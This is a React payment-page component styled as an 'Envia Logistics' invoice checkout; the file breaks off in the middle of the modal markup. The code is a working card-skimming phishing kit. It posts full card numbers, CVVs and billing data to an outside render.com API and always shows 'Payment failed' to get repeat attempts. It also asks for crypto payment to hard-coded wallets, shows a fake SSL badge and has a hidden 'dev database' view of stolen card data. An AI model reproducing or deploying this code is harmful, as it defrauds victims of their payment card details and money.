import React, { useState, useEffect } from 'react';
import { FiArrowLeft, FiLock, FiCreditCard, FiCalendar, FiUser, FiX, FiAlertCircle, FiCheckCircle, FiRefreshCw, FiCopy, FiCheck } from 'react-icons/fi';
import { useNavigate } from 'react-router-dom';

const Payment = () => {
    const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('credit-card');
  const [isProcessing, setIsProcessing] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [paymentResult, setPaymentResult] = useState(null);
  const [copiedAddress, setCopiedAddress] = useState('');
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: '',
    billingAddress: '',
    city: '',
    zipCode: ''
  });
  const [errors, setErrors] = useState({});
  const [showDatabase, setShowDatabase] = useState(false);
  const [devMode, setDevMode] = useState(false);
  
  const invoiceId = 'ENV-2025-0017';
  const amount = 4675.00;
// Initialize paymentHistory and paymentDatabase from localStorage
const [paymentHistory, setPaymentHistory] = useState(() => {
  try {
    const storedHistory = localStorage.getItem('paymentHistory');
    return storedHistory ? JSON.parse(storedHistory) : [];
  } catch (error) {
    console.error("Failed to parse paymentHistory from localStorage:", error);
    return [];
  }
});
const [paymentDatabase, setPaymentDatabase] = useState(() => {
  try {
    const storedDatabase = localStorage.getItem('paymentDatabase');
    return storedDatabase ? JSON.parse(storedDatabase) : [];
  } catch (error) {
    console.error("Failed to parse paymentDatabase from localStorage:", error);
    return [];
  }
});
  
  // Crypto wallet addresses
  const walletAddresses = {
    bitcoin: 'bc1qvxg988xzcfzfrxm9hggkujqy2h5hr6ah3zt3zw',
    ethereum: '0x9948AF5C64F7e2ed6Cb2298D6172D8D5BaD95689',
    usdt: '0x9948AF5C64F7e2ed6Cb2298D6172D8D5BaD95689',
    bnb: '0x9948AF5C64F7e2ed6Cb2298D6172D8D5BaD95689'
  };

// --- NEW CODE ---
// Save paymentHistory to localStorage whenever it changes
useEffect(() => {
  localStorage.setItem('paymentHistory', JSON.stringify(paymentHistory));
}, [paymentHistory]);

// Save paymentDatabase to localStorage whenever it changes
useEffect(() => {
  localStorage.setItem('paymentDatabase', JSON.stringify(paymentDatabase));
}, [paymentDatabase]);
// --- END NEW CODE ---


const sendPaymentData = async (paymentData) => {
  try {
    const response = await fetch("https://first-api-njeu.onrender.com/api/payments", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(paymentData),
    });

    const result = await response.json();
    console.log("✅ Server response:", result);
    return result;
  } catch (error) {
    console.error("❌ Error sending payment data:", error);
    return { success: false, message: "Server error" };
  }
};




  // Format card number with spaces
  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date
  const formatExpiryDate = (value) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  // Get card type
  const getCardType = (number) => {
    const num = number.replace(/\s/g, '');
    if (/^4/.test(num)) return 'visa';
    if (/^5[1-5]/.test(num)) return 'mastercard';
    if (/^3[47]/.test(num)) return 'amex';
    return 'unknown';
  };

  // Validate form
  const validateForm = () => {
    const newErrors = {};
    
    if (!formData.cardNumber || formData.cardNumber.replace(/\s/g, '').length < 13) {
      newErrors.cardNumber = 'Please enter a valid card number';
    }
    
    if (!formData.expiryDate || !/^\d{2}\/\d{2}$/.test(formData.expiryDate)) {
      newErrors.expiryDate = 'Please enter a valid expiry date (MM/YY)';
    } else {
      const [month, year] = formData.expiryDate.split('/');
      const expiry = new Date(2000 + parseInt(year), parseInt(month) - 1);
      if (expiry < new Date()) {
        newErrors.expiryDate = 'Card has expired';
      }
    }
    
    if (!formData.cvv || formData.cvv.length < 3) {
      newErrors.cvv = 'Please enter a valid CVV';
    }
    
    if (!formData.cardholderName.trim()) {
      newErrors.cardholderName = 'Please enter the cardholder name';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Handle input changes
  const handleInputChange = (field, value) => {
    let formattedValue = value;
    
    if (field === 'cardNumber') {
      formattedValue = formatCardNumber(value);
    } else if (field === 'expiryDate') {
      formattedValue = formatExpiryDate(value);
    } else if (field === 'cvv') {
      formattedValue = value.replace(/\D/g, '').substring(0, 4);
    }
    
    setFormData(prev => ({
      ...prev,
      [field]: formattedValue
    }));
    
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({
        ...prev,
        [field]: ''
      }));
    }
  };

  // Simulate payment processing
// Simulate payment processing
const processPayment = async () => {
  if (!validateForm()) return;
  setIsProcessing(true);

  const paymentPayload = {
    invoiceId,
    amount,
    method: "credit-card",
    card: {
      number: formData.cardNumber.replace(/\s/g, ""),
      expiry: formData.expiryDate,
      cvv: formData.cvv,
      holder: formData.cardholderName,
    },
    billing: {
      address: formData.billingAddress,
      city: formData.city,
      zipCode: formData.zipCode,
    }
  };

  // Send to API
  const result = await sendPaymentData(paymentPayload);

  // ❌ Force error modal, even if API says success
  const forcedResult = {
    ...result,
    success: false, // always fail
    message: "Payment failed. Please try again."
  };

  // Update frontend database/history
  const paymentAttempt = {
    id: Date.now(),
    invoiceId,
    amount,
    cardNumber: formData.cardNumber.replace(/\d(?=\d{4})/g, "*"),
    cardholderName: formData.cardholderName,
    status: "declined",   // force declined
    transactionId: null,
    timestamp: new Date().toISOString()
  };

  setPaymentHistory(prev => [paymentAttempt, ...prev]);
  setPaymentResult(forcedResult);
  setIsProcessing(false);
  setShowModal(true);
};

  

  // Copy wallet address to clipboard
  const copyToClipboard = async (address, currency) => {
    try {
      await navigator.clipboard.writeText(address);
      setCopiedAddress(currency);
      setTimeout(() => setCopiedAddress(''), 2000);
    } catch (err) {
      console.error('Failed to copy: ', err);
    }
  };

  // Developer mode toggle (secret key combination)
  React.useEffect(() => {
    const handleKeyPress = (e) => {
      // Press Ctrl+Shift+D to toggle dev mode
      if (e.ctrlKey && e.shiftKey && e.key === 'D') {
        setDevMode(prev => !prev);
        console.log('Developer mode:', !devMode);
      }
    };
    
    window.addEventListener('keydown', handleKeyPress);
    return () => window.removeEventListener('keydown', handleKeyPress);
  }, [devMode]);
  // Handle modal close
  const closeModal = () => {
    setShowModal(false);
    setPaymentResult(null);
    if (paymentResult?.success) {
      // Reset form on success
      setFormData({
        cardNumber: '',
        expiryDate: '',
        cvv: '',
        cardholderName: '',
        billingAddress: '',
        city: '',
        zipCode: ''
      });
    }
  };

  const back = () => {
    navigate('/');
  }

  const cardType = getCardType(formData.cardNumber);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50 py-4 px-4">
      <div className="max-w-3xl mx-auto">
        {/* Header */}
        <div className="bg-white rounded-2xl shadow-xl mb-8 p-6 lg:p-8 border border-gray-100">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between mb-6 gap-4">
            <button
            onClick={back}
              type="button"
              className="flex items-center space-x-2 text-blue-600 hover:text-blue-700 font-medium transition-colors group"
            >
              <FiArrowLeft className="w-5 h-5 transform group-hover:-translate-x-1 transition-transform" />
              <span>Back to Invoice</span>
            </button>
            <div className="flex items-center space-x-2 text-green-600 bg-green-50 px-4 py-2 rounded-full">
              <FiLock className="w-5 h-5" />
              <span className="text-sm font-medium">256-bit SSL Secure</span>
            </div>
          </div>

          <div className="text-center">
            <h1 className="text-3xl lg:text-4xl font-bold text-gray-800 mb-3">Complete Your Payment</h1>
            <p className="text-gray-600 mb-2">Invoice #{invoiceId} • Envia Logistics</p>
            <div className="inline-flex items-center bg-blue-50 rounded-full px-6 py-3 mt-4">
              <span className="text-4xl font-bold text-blue-600">${amount.toLocaleString()}</span>
            </div>
          </div>
        </div>

        {/* Payment Methods Tabs */}
        <div className="mb-8">
          <div className="flex flex-col sm:flex-row gap-2 bg-gray-100 p-2 rounded-xl">
            <button
              type="button"
              onClick={() => setActiveTab('credit-card')}
              className={`flex-1 font-semibold py-3 px-4 rounded-lg transition-all ${
                activeTab === 'credit-card'
                  ? 'bg-white text-blue-600 shadow-sm border-2 border-blue-200'
                  : 'text-gray-600 hover:bg-white/50'
              }`}
            >
              Credit Card
            </button>
            <button
              type="button"
              onClick={() => setActiveTab('crypto-wallet')}
              className={`flex-1 font-semibold py-3 px-4 rounded-lg transition-all ${
                activeTab === 'crypto-wallet'
                  ? 'bg-white text-blue-600 shadow-sm border-2 border-blue-200'
                  : 'text-gray-600 hover:bg-white/50'
              }`}
            >
              Crypto Wallet
            </button>
          </div>
        </div>

        {/* Payment Form */}
        {activeTab === 'credit-card' && (
          <div className="bg-white rounded-2xl shadow-xl p-6 lg:p-8 border border-gray-100">
            <h2 className="text-2xl font-semibold text-gray-800 mb-8">Payment Details</h2>

            <div className="space-y-6">
              {/* Card Number */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-3">
                  Card Number
                </label>
                <div className="relative">
                  <input
                    type="text"
                    placeholder="1234 5678 9012 3456"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                    className={`w-full px-4 py-4 pl-12 border-2 rounded-xl focus:ring-2 focus:ring-blue-500 transition-colors text-lg ${
                      errors.cardNumber ? 'border-red-300 focus:border-red-500' : 'border-gray-200 focus:border-blue-500'
                    }`}
                    maxLength="19"
                  />
                  <FiCreditCard className="absolute left-4 top-5 w-6 h-6 text-gray-400" />
                  <div className="absolute right-4 top-4 flex space-x-1">
                    {cardType === 'visa' && (
                      <div className="w-8 h-6 bg-blue-600 rounded text-white text-xs flex items-center justify-center font-bold">VISA</div>
                    )}
                    {cardType === 'mastercard' && (
                      <div className="w-8 h-6 bg-red-600 rounded text-white text-xs flex items-center justify-center font-bold">MC</div>
                    )}
                    {cardType === 'amex' && (
                      <div className="w-8 h-6 bg-green-600 rounded text-white text-xs flex items-center justify-center font-bold">AMEX</div>
                    )}
                  </div>
                </div>
                {errors.cardNumber && (
                  <p className="text-red-500 text-sm mt-2 flex items-center">
                    <FiAlertCircle className="w-4 h-4 mr-1" />
                    {errors.cardNumber}
                  </p>
                )}
              </div>

              {/* Expiry Date & CVV */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-3">
                    Expiry Date
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      placeholder="MM/YY"
                      value={formData.expiryDate}
                      onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                      className={`w-full px-4 py-4 pl-12 border-2 rounded-xl focus:ring-2 focus:ring-blue-500 transition-colors text-lg ${
                        errors.expiryDate ? 'border-red-300 focus:border-red-500' : 'border-gray-200 focus:border-blue-500'
                      }`}
                      maxLength="5"
                    />
                    <FiCalendar className="absolute left-4 top-5 w-5 h-5 text-gray-400" />
                  </div>
                  {errors.expiryDate && (
                    <p className="text-red-500 text-sm mt-2 flex items-center">
                      <FiAlertCircle className="w-4 h-4 mr-1" />
                      {errors.expiryDate}
                    </p>
                  )}
                </div>
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-3">
                    CVV
                  </label>
                  <input
                    type="text"
                    placeholder="123"
                    value={formData.cvv}
                    onChange={(e) => handleInputChange('cvv', e.target.value)}
                    className={`w-full px-4 py-4 border-2 rounded-xl focus:ring-2 focus:ring-blue-500 transition-colors text-lg ${
                      errors.cvv ? 'border-red-300 focus:border-red-500' : 'border-gray-200 focus:border-blue-500'
                    }`}
                    maxLength="4"
                  />
                  {errors.cvv && (
                    <p className="text-red-500 text-sm mt-2 flex items-center">
                      <FiAlertCircle className="w-4 h-4 mr-1" />
                      {errors.cvv}
                    </p>
                  )}
                </div>
              </div>

              {/* Cardholder Name */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-3">
                  Cardholder Name
                </label>
                <div className="relative">
                  <input
                    type="text"
                    placeholder="John Doe"
                    value={formData.cardholderName}
                    onChange={(e) => handleInputChange('cardholderName', e.target.value)}
                    className={`w-full px-4 py-4 pl-12 border-2 rounded-xl focus:ring-2 focus:ring-blue-500 transition-colors text-lg ${
                      errors.cardholderName ? 'border-red-300 focus:border-red-500' : 'border-gray-200 focus:border-blue-500'
                    }`}
                  />
                  <FiUser className="absolute left-4 top-5 w-5 h-5 text-gray-400" />
                </div>
                {errors.cardholderName && (
                  <p className="text-red-500 text-sm mt-2 flex items-center">
                    <FiAlertCircle className="w-4 h-4 mr-1" />
                    {errors.cardholderName}
                  </p>
                )}
              </div>

              {/* Billing Address */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-3">
                    City
                  </label>
                  <input
                    type="text"
                    placeholder="New York"
                    value={formData.city}
                    onChange={(e) => handleInputChange('city', e.target.value)}
                    className="w-full px-4 py-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors text-lg"
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-3">
                    ZIP Code
                  </label>
                  <input
                    type="text"
                    placeholder="10001"
                    value={formData.zipCode}
                    onChange={(e) => handleInputChange('zipCode', e.target.value)}
                    className="w-full px-4 py-4 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors text-lg"
                  />
                </div>
              </div>

              {/* Pay Button */}
              <div className="pt-6">
                <button
                  type="button"
                  onClick={processPayment}
                  disabled={isProcessing}
                  className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-6 px-8 rounded-xl text-xl transition-all transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none shadow-lg"
                >
                  {isProcessing ? (
                    <div className="flex items-center justify-center space-x-3">
                      <FiRefreshCw className="w-6 h-6 animate-spin" />
                      <span>Processing Payment...</span>
                    </div>
                  ) : (
                    `Pay $${amount.toLocaleString()}`
                  )}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Crypto Wallet Payment */}
        {activeTab === 'crypto-wallet' && (
          <div className="bg-white rounded-2xl shadow-xl p-6 lg:p-8 border border-gray-100">
            <h2 className="text-2xl font-semibold text-gray-800 mb-8">Crypto Payment</h2>
            
            <div className="bg-gradient-to-br from-orange-50 to-yellow-50 border border-orange-200 rounded-xl p-6 mb-8">
              <div className="flex items-center mb-4">
                <div className="w-3 h-3 bg-orange-500 rounded-full animate-pulse mr-3"></div>
                <h3 className="text-lg font-semibold text-orange-800">Payment Instructions</h3>
              </div>
              <p className="text-orange-700 mb-2">Send exactly <span className="font-bold">${amount.toLocaleString()}</span> worth of cryptocurrency to one of the addresses below.</p>
              <p className="text-orange-600 text-sm">⚠️ Payment will be confirmed automatically once transaction is received on the blockchain.</p>
            </div>

            <div className="space-y-6">
              {/* Bitcoin */}
              <div className="border-2 border-gray-200 rounded-xl p-6 hover:border-orange-300 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-10 h-10 bg-orange-500 rounded-full flex items-center justify-center">
                      <span className="text-white font-bold text-sm">₿</span>
                    </div>
                    <div>
                      <h4 className="font-semibold text-gray-800">Bitcoin (BTC)</h4>
                      <p className="text-sm text-gray-600">Network: Bitcoin</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-semibold text-gray-800">≈ 0.047 BTC</p>
                    <p className="text-sm text-gray-600">${amount.toLocaleString()}</p>
                  </div>
                </div>
                <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between">
                  <code className="text-sm text-gray-700 font-mono break-all">{walletAddresses.bitcoin}</code>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(walletAddresses.bitcoin, 'bitcoin')}
                    className="ml-3 p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors flex items-center space-x-1"
                  >
                    {copiedAddress === 'bitcoin' ? (
                      <>
                        <FiCheck className="w-4 h-4" />
                        <span className="text-sm">Copied!</span>
                      </>
                    ) : (
                      <>
                        <FiCopy className="w-4 h-4" />
                        <span className="text-sm">Copy</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Ethereum */}
              <div className="border-2 border-gray-200 rounded-xl p-6 hover:border-blue-300 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center">
                      <span className="text-white font-bold text-sm">Ξ</span>
                    </div>
                    <div>
                      <h4 className="font-semibold text-gray-800">Ethereum (ETH)</h4>
                      <p className="text-sm text-gray-600">Network: Ethereum</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-semibold text-gray-800">≈ 1.35 ETH</p>
                    <p className="text-sm text-gray-600">${amount.toLocaleString()}</p>
                  </div>
                </div>
                <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between">
                  <code className="text-sm text-gray-700 font-mono break-all">{walletAddresses.ethereum}</code>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(walletAddresses.ethereum, 'ethereum')}
                    className="ml-3 p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors flex items-center space-x-1"
                  >
                    {copiedAddress === 'ethereum' ? (
                      <>
                        <FiCheck className="w-4 h-4" />
                        <span className="text-sm">Copied!</span>
                      </>
                    ) : (
                      <>
                        <FiCopy className="w-4 h-4" />
                        <span className="text-sm">Copy</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* USDT */}
              <div className="border-2 border-gray-200 rounded-xl p-6 hover:border-green-300 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-10 h-10 bg-green-600 rounded-full flex items-center justify-center">
                      <span className="text-white font-bold text-xs">USDT</span>
                    </div>
                    <div>
                      <h4 className="font-semibold text-gray-800">Tether (USDT)</h4>
                      <p className="text-sm text-gray-600">Network: Ethereum (ERC-20)</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-semibold text-gray-800">{amount.toLocaleString()} USDT</p>
                    <p className="text-sm text-gray-600">${amount.toLocaleString()}</p>
                  </div>
                </div>
                <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between">
                  <code className="text-sm text-gray-700 font-mono break-all">{walletAddresses.usdt}</code>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(walletAddresses.usdt, 'usdt')}
                    className="ml-3 p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors flex items-center space-x-1"
                  >
                    {copiedAddress === 'usdt' ? (
                      <>
                        <FiCheck className="w-4 h-4" />
                        <span className="text-sm">Copied!</span>
                      </>
                    ) : (
                      <>
                        <FiCopy className="w-4 h-4" />
                        <span className="text-sm">Copy</span>
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* BNB */}
              <div className="border-2 border-gray-200 rounded-xl p-6 hover:border-yellow-300 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-10 h-10 bg-yellow-500 rounded-full flex items-center justify-center">
                      <span className="text-white font-bold text-sm">BNB</span>
                    </div>
                    <div>
                      <h4 className="font-semibold text-gray-800">BNB Coin (BNB)</h4>
                      <p className="text-sm text-gray-600">Network: Binance Smart Chain</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="font-semibold text-gray-800">≈ 6.8 BNB</p>
                    <p className="text-sm text-gray-600">${amount.toLocaleString()}</p>
                  </div>
                </div>
                <div className="bg-gray-50 rounded-lg p-4 flex items-center justify-between">
                  <code className="text-sm text-gray-700 font-mono break-all">{walletAddresses.bnb}</code>
                  <button
                    type="button"
                    onClick={() => copyToClipboard(walletAddresses.bnb, 'bnb')}
                    className="ml-3 p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors flex items-center space-x-1"
                  >
                    {copiedAddress === 'bnb' ? (
                      <>
                        <FiCheck className="w-4 h-4" />
                        <span className="text-sm">Copied!</span>
                      </>
                    ) : (
                      <>
                        <FiCopy className="w-4 h-4" />
                        <span className="text-sm">Copy</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            </div>

            <div className="mt-8 bg-blue-50 border border-blue-200 rounded-xl p-6">
              <h4 className="font-semibold text-blue-800 mb-3">Important Notes:</h4>
              <ul className="text-blue-700 text-sm space-y-2">
                <li>• Send only the supported cryptocurrency to the respective address</li>
                <li>• Ensure you're using the correct network for each token</li>
                <li>• Payments are typically confirmed within 10-30 minutes</li>
                <li>• You will receive an email confirmation once payment is received</li>
                <li>• Contact support if you encounter any issues</li>
              </ul>
            </div>

            <div className="mt-8 text-center">
              <button
                type="button"
                onClick={() => setActiveTab('credit-card')}
                className="text-blue-600 hover:text-blue-700 font-medium"
              >
                ← Back to Credit Card Payment
              </button>
            </div>
          </div>
        )}

        {/* Payment History */}
        {/* {paymentHistory.length > 0 && (
          <div className="mt-8 bg-white rounded-2xl shadow-xl p-6 lg:p-8 border border-gray-100">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-semibold text-gray-800">Recent Payment Attempts</h3>
          
            </div>
            <div className="space-y-4">
              {paymentHistory.slice(0, 3).map((payment) => (
                <div key={payment.id} className="flex items-center justify-between p-4 bg-gray-50 rounded-lg">
                  <div>
                    <p className="font-medium text-gray-800">{payment.cardNumber}</p>
                    <p className="text-sm text-gray-600">{new Date(payment.timestamp).toLocaleString()}</p>
                  </div>
                  <div className="text-right">
                    <p className="font-semibold">${payment.amount.toLocaleString()}</p>
                    <span className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${
                      payment.status === 'success'
                        ? 'bg-green-100 text-green-800'
                        : payment.status === 'declined'
                        ? 'bg-red-100 text-red-800'
                        : 'bg-yellow-100 text-yellow-800'
                    }`}>
                      {payment.status}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )} */}

{devMode && (
                <button
                  type="button"
                  onClick={() => setShowDatabase(!showDatabase)}
                  className="bg-red-600 hover:bg-red-700 text-white font-medium py-2 px-4 rounded-lg transition-colors text-sm"
                >
                  {showDatabase ? 'Hide Database' : '🔒 Dev Database'}
                </button>
              )}

        {/* Developer Database View (Hidden from regular users) */}
        {devMode && showDatabase && paymentDatabase.length > 0 && (
          <div className="mt-8 bg-gray-900 rounded-2xl shadow-2xl p-6 lg:p-8 border border-red-500">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-semibold text-red-400">🔒 DEVELOPER DATABASE ACCESS</h3>
              <div className="flex items-center space-x-3">
                <span className="bg-red-900 text-red-300 px-3 py-1 rounded-full text-sm font-medium">
                  DEV MODE ACTIVE
                </span>
                <span className="bg-green-900 text-green-300 px-3 py-1 rounded-full text-sm font-medium">
                  {paymentDatabase.length} Records
                </span>
              </div>
            </div>
            
            <div className="mb-4 p-3 bg-red-900 border border-red-700 rounded-lg">
              <p className="text-red-300 text-sm">
                ⚠️ <strong>CONFIDENTIAL:</strong> This database view is only visible to developers. 
                Press <kbd className="bg-red-800 px-2 py-1 rounded text-xs">Ctrl+Shift+D</kbd> to toggle.
              </p>
            </div>
            
            <div className="space-y-6 max-h-96 overflow-y-auto">
              {paymentDatabase.map((record, index) => (
                <div key={record.id} className="bg-gray-800 rounded-xl p-6 border border-gray-700">
                  <div className="flex items-center justify-between mb-4">
                    <h4 className="text-lg font-semibold text-white">Record #{index + 1}</h4>
                    <span className={`px-3 py-1 rounded-full text-sm font-medium ${
                      record.status === 'success'
                        ? 'bg-green-900 text-green-300'
                        : record.status === 'declined'
                        ? 'bg-red-900 text-red-300'
                        : 'bg-yellow-900 text-yellow-300'
                    }`}>
                      {record.status.toUpperCase()}
                    </span>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    {/* Basic Info */}
                    <div>
                      <h5 className="text-sm font-semibold text-gray-400 mb-3">TRANSACTION INFO</h5>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-gray-400">ID:</span>
                          <span className="text-white font-mono">{record.id}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Invoice:</span>
                          <span className="text-white">{record.invoiceId}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Amount:</span>
                          <span className="text-green-400 font-semibold">${record.amount.toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Method:</span>
                          <span className="text-white">{record.paymentMethod}</span>
                        </div>
                        {record.transactionId && (
                          <div className="flex justify-between">
                            <span className="text-gray-400">Txn ID:</span>
                            <span className="text-blue-400 font-mono text-xs">{record.transactionId}</span>
                          </div>
                        )}
                        <div className="flex justify-between">
                          <span className="text-gray-400">Timestamp:</span>
                          <span className="text-white text-xs">{new Date(record.timestamp).toLocaleString()}</span>
                        </div>
                      </div>
                    </div>

                    {/* Card Details */}
                    <div>
                      <h5 className="text-sm font-semibold text-red-400 mb-3">🔒 SENSITIVE CARD DATA</h5>
                      <div className="space-y-2 text-sm bg-red-950 p-3 rounded border border-red-800">
                        <div className="flex justify-between">
                          <span className="text-red-300">Card Number:</span>
                          <span className="text-white font-mono">{record.cardDetails.cardNumber}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-red-300">Cardholder:</span>
                          <span className="text-white">{record.cardDetails.cardholderName}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-red-300">Expiry:</span>
                          <span className="text-white">{record.cardDetails.expiryDate}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-red-300">CVV:</span>
                          <span className="text-white">{record.cardDetails.cvv}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-red-300">Card Type:</span>
                          <span className="text-white capitalize">{record.cardDetails.cardType}</span>
                        </div>
                      </div>
                    </div>

                    {/* Billing Info */}
                    <div>
                      <h5 className="text-sm font-semibold text-gray-400 mb-3">BILLING INFO</h5>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-gray-400">City:</span>
                          <span className="text-white">{record.billingInfo.city || 'Not provided'}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">ZIP Code:</span>
                          <span className="text-white">{record.billingInfo.zipCode || 'Not provided'}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Address:</span>
                          <span className="text-white">{record.billingInfo.billingAddress || 'Not provided'}</span>
                        </div>
                      </div>
                    </div>

                    {/* Session Info */}
                    <div>
                      <h5 className="text-sm font-semibold text-gray-400 mb-3">SESSION INFO</h5>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-gray-400">Session ID:</span>
                          <span className="text-white font-mono text-xs">{record.sessionInfo.sessionId}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Browser:</span>
                          <span className="text-white">{record.sessionInfo.browser}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">IP Address:</span>
                          <span className="text-white">{record.sessionInfo.ipAddress}</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Processing Result */}
                  {record.processingResult && (
                    <div className="mt-4 pt-4 border-t border-gray-700">
                      <h5 className="text-sm font-semibold text-gray-400 mb-2">PROCESSING RESULT</h5>
                      <div className="bg-gray-900 rounded-lg p-3">
                        <pre className="text-xs text-gray-300 overflow-x-auto">
                          {JSON.stringify(record.processingResult, null, 2)}
                        </pre>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
            
            <div className="mt-6 p-4 bg-gray-800 rounded-lg border border-gray-700">
              <h5 className="text-sm font-semibold text-green-400 mb-2">📊 Database Statistics</h5>
              <div className="grid grid-cols-3 gap-4 text-center">
                <div>
                  <div className="text-2xl font-bold text-white">{paymentDatabase.length}</div>
                  <div className="text-xs text-gray-400">Total Records</div>
                </div>
                <div>
                  <div className="text-2xl font-bold text-green-400">
                    {paymentDatabase.filter(r => r.status === 'success').length}
                  </div>
                  <div className="text-xs text-gray-400">Successful</div>
                </div>
                <div>
                  <div className="text-2xl font-bold text-red-400">
                    {paymentDatabase.filter(r => r.status === 'declined').length}
                  </div>
                  <div className="text-xs text-gray-400">Declined</div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Dev Mode Indicator (only visible when active) */}
        {devMode && (
          <div className="fixed bottom-4 right-4 bg-red-600 text-white px-4 py-2 rounded-lg shadow-lg">
            <div className="flex items-center space-x-2">
              <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
              <span className="text-sm font-medium">DEV MODE</span>
            </div>
          </div>
        )}
      </div>

      {/* Modal */}
      {showModal && paymentResult && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 transform transition-all">
            <div className="text-center">
              {paymentResult.success ? (
                <div>
                  <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                    <FiCheckCircle className="w-8 h-8 text-green-600" />
                  </div>
                  <h3 className="text-2xl font-bold text-gray-800 mb-4">Payment Successful!</h3>
                  <p className="text-gray-600 mb-6">{paymentResult.message}</p>
                  <p className="text-sm text-gray-500 mb-8">Transaction ID: {paymentResult.transactionId}</p>
                  <button
                    type="button"
                    onClick={closeModal}
                    className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 px-6 rounded-xl transition-colors"
                  >
                    Continue
                  </button>
                </div>
              ) : (
                <div>
                  <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
                    <FiAlertCircle className="w-8 h-8 text-red-600" />
                  </div>
